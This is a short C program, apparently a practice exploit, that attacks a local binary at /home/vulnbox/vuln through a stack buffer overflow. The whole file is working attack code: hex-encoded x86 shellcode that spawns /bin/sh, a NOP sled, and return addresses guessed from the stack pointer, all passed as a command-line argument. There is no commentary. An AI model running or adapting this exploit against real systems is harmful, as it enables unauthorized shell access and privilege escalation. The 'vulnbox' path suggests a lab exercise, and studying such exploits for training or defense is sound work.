#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#define NOP     0x90
#define LEN     80

char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}
void main() {
	char buffer[LEN];
	int i;
	unsigned long retaddr = get_sp() - 0x34;
		
	printf("esp: 0x%x ret:0x%x\n", get_sp(),retaddr);
	for (i=0;i<LEN;i+=4)
	{
   		*(long *)&buffer[i] = retaddr;
	}
	for (i=0;i<LEN-strlen(code)-48;i++)
	{
	  	*(buffer+i) = NOP;
	}
	memcpy(buffer+i,code,strlen(code));
	
	execlp("/home/vulnbox/vuln","/home/vulnbox/vuln",buffer,NULL);
	
}
